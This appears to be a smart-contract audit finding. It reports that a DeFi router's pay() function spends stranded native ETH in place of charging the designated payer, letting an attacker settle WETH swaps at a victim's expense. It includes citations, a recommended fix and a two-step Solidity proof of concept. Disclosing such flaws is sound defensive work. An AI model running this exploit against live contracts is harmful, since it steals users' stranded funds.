### Title
Router `pay()` Ignores Designated Payer When Native ETH Balance Is Sufficient, Allowing Theft of Stranded ETH via WETH Swap - (File: metric-periphery/contracts/base/PeripheryPayments.sol)

### Summary
The `pay()` function in `PeripheryPayments` silently substitutes the router's own native ETH balance for the designated `payer`'s WETH whenever `address(this).balance >= value`. Because the router is `payable` and does not attribute ETH to individual callers, any ETH stranded from a prior user's transaction can be consumed by a subsequent attacker's WETH swap at zero cost to the attacker.

### Finding Description
`PeripheryPayments.pay()` handles WETH settlement with the following logic:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);   // payer never touched
    } else if (nativeBalance > 0) {
        ...
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
``` [1](#0-0) 

When `nativeBalance >= value`, the `payer` argument is completely ignored. The router wraps its own ETH and forwards WETH to the pool. No `transferFrom` is ever called on the designated payer.

ETH accumulates on the router whenever a caller sends `msg.value` to any `payable` entry point (`exactInputSingle`, `exactOutputSingle`, `exactInput`, `exactOutput`, `multicall`, `addLiquidityExactShares`, `addLiquidityWeighted`) and does not include a `refundETH()` call to recover the excess. The router's `receive()` guard only blocks direct ETH pushes; it does not prevent `msg.value` from accumulating across calls. [2](#0-1) 

The `_justPayCallback` and `_exactOutputIterateCallback` both route through `pay()` with the original `msg.sender` as `payer`: [3](#0-2) [4](#0-3) 

The same `pay()` path is used by `MetricOmmPoolLiquidityAdder.metricOmmModifyLiquidityCallback()`: [5](#0-4) 

### Impact Explanation
An attacker can execute a WETH-input swap (or WETH-leg liquidity add) and pay zero from their own wallet. The pool receives the correct WETH amount (its `IncorrectDelta` check passes), so the pool is unharmed. The loss falls entirely on the victim whose ETH was stranded: their ETH is consumed to settle the attacker's trade. The attacker receives the full output token amount for free. Loss magnitude equals the stranded ETH balance, which can be up to the victim's full `msg.value`.

### Likelihood Explanation
ETH stranding is a routine operational outcome. The standard multicall pattern for native-ETH WETH swaps requires the user to append `refundETH()` as the final call. Any user who omits this step (e.g., sends `multicall{value: 2 ETH}` for a 1 ETH swap without a trailing `refundETH`) leaves 1 ETH on the router. The router holds no per-user accounting, so the stranded ETH is immediately available to any subsequent caller. A MEV bot monitoring the mempool can front-run the victim's transaction or back-run it in the same block.

### Recommendation
Track the ETH that arrived with the current top-level call in transient storage (e.g., record `msg.value` at entry and decrement it as it is consumed). In `pay()`, only use native ETH up to the amount attributed to the current call, and revert or fall back to `transferFrom` if the attributed balance is insufficient. Alternatively, require that WETH swaps always pull from the payer via `transferFrom` and treat native ETH wrapping as a separate, explicitly-bounded pre-step.

### Proof of Concept

**Setup:** WETH/token1 pool exists. Router is deployed.

**Step 1 – Victim strands ETH:**
```solidity
// Victim sends 2 ETH but swap only costs 1 ETH; no refundETH() call
router.exactInputSingle{value: 2 ether}(ExactInputSingleParams({
    pool: pool,
    tokenIn: address(weth),
    tokenOut: address(token1),
    zeroForOne: true,
    amountIn: 1 ether,          // only 1 ETH consumed
    amountOutMinimum: 0,
    recipient: victim,
    deadline: block.timestamp + 1,
    priceLimitX64: 0,
    extensionData: ""
}));
// 1 ETH now stranded on router; address(router).balance == 1 ether
```

**Step 2 – Attacker exploits:**
```solidity
// Attacker sends 0 ETH, has 0 WETH, has 0 allowance
// pay() sees nativeBalance (1 ETH) >= value (1 ETH) → wraps victim's ETH, pays pool
router.exactInputSingle{value: 0}(ExactInputSingleParams({
    pool: pool,
    tokenIn: address(weth),
    tokenOut: address(token1),
    zeroForOne: true,
    amountIn: 1 ether,
    amountOutMinimum: 0,
    recipient: attacker,
    deadline: block.timestamp + 1,
    priceLimitX64: 0,
    extensionData: ""
}));
// Attacker receives token1 output; victim's 1 ETH is gone
```

The pool's post-callback balance check (`balance0Before + amount0Delta > balance0()`) passes because the router correctly deposited WETH into the pool — sourced from the victim's stranded ETH. The attacker paid nothing.

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L207-213)
```text
    if (tradesLeft == 0) {
      // forge-lint: disable-next-line(unsafe-typecast)
      uint256 amountIn = uint256(amountToPay);
      if (amountIn > cb.amountInMax) revert InputTooHigh(amountIn, cb.amountInMax);
      _setExactOutputAmountIn(amountIn);
      pay(_getTokenToPay(), _getPayer(), msg.sender, amountIn);
      return;
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L172-177)
```text
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```
